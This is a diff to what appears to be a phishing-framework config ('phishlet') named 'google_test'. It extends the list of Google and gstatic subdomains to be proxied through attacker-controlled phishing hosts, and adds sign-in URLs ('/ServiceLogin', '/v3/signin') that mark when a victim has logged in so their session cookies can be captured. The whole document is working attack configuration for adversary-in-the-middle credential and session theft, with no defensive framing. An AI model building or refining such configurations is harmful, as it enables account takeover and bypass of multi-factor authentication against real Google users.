@@ -5,8 +5,15 @@ name: 'google_test'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
-#  - {phish_sub: 'www2', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+#  - {phish_sub: 'lh32', orig_sub: 'lh3', domain: 'googleusercontent.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+
   # Add more as needed
 
 sub_filters:
@@ -27,6 +34,8 @@ auth_tokens:
     type: 'cookie'  # CRITICAL - don't forget this!
 
 auth_urls:
+  - '/ServiceLogin'
+  - '/v3/signin'
   - '/CheckCookie'
   - '/ManageAccount'
 
